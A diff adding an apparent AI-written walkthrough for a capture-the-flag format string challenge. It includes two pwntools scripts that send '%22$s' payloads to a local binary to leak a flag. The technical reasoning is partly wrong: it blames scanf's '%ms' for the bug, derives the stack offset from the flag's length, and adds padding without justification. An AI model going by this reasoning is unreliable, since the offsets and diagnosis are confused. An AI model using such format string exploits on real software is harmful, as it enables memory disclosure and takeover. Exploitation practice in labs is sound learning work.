@@ -1,0 +1,91 @@
+To solve this challenge using `pwntools`, you need to understand the vulnerability and then craft an exploit. The key function in the provided decompiled code is `main`, which reads the flag from `flag.txt` and compares it with user input. The vulnerability here is in the use of `%ms` in `__isoc99_scanf`, which can be exploited to cause a format string vulnerability.
+
+Here are the steps to solve this challenge:
+
+1. **Understand the Vulnerability**:
+   - The `__isoc99_scanf("%ms", &format);` line reads a string from the user and stores it in the `format` variable.
+   - The `printf(format);` line uses the user-provided `format` as the format string, which is a classic format string vulnerability.
+
+2. **Exploit the Format String Vulnerability**:
+   - You can use the format string vulnerability to leak the flag or overwrite the return address to control the program flow.
+
+3. **Use `pwntools` to Craft the Exploit**:
+   - Use `pwntools` to send a crafted payload that exploits the format string vulnerability.
+
+Here is a step-by-step guide and the corresponding `pwntools` code:
+
+### Step 1: Set Up Your Environment
+Make sure you have `pwntools` installed. If not, you can install it using pip:
+```sh
+pip install pwntools
+```
+
+### Step 2: Write the Exploit Script
+
+Create a Python script to interact with the binary and exploit the format string vulnerability.
+
+```python
+from pwn import *
+
+# Set up the process
+binary = './fmt'
+p = process(binary)
+
+# Function to interact with the binary and send the payload
+def send_payload(payload):
+    p.sendlineafter("what's the flag\n", payload)
+    return p.recvall()
+
+# Craft the payload
+# Since we know the flag is 22 characters long (including the null terminator), we can use a format string to leak the flag
+payload = b"%22$s"
+
+# Send the payload and get the response
+response = send_payload(payload)
+
+# Print the response
+print(response)
+
+# Close the process
+p.close()
+```
+
+### Step 3: Run the Script
+Run the script to see if it successfully leaks the flag. If the flag is not directly leaked, you may need to adjust the payload to correctly position the stack and leak the flag.
+
+### Step 4: Adjust the Payload
+If the initial payload does not work, you may need to adjust the payload to correctly position the stack and leak the flag. For example, you might need to add some padding or adjust the format string.
+
+Here is an adjusted payload example:
+
+```python
+from pwn import *
+
+# Set up the process
+binary = './fmt'
+p = process(binary)
+
+# Function to interact with the binary and send the payload
+def send_payload(payload):
+    p.sendlineafter("what's the flag\n", payload)
+    return p.recvall()
+
+# Craft the payload
+# Adjust the payload to correctly position the stack and leak the flag
+payload = b"A" * 20 + b"%22$s"
+
+# Send the payload and get the response
+response = send_payload(payload)
+
+# Print the response
+print(response)
+
+# Close the process
+p.close()
+```
+
+### Step 5: Analyze the Response
+Analyze the response to extract the flag. The flag should be part of the response if the payload is crafted correctly.
+
+### Final Note
+The exact payload may vary depending on the specifics of the binary and the environment. You may need to experiment with different payloads and offsets to successfully leak the flag. If the flag is not directly leaked, you might need to use more advanced techniques such as overwriting the return address or using other gadgets to control the program flow.
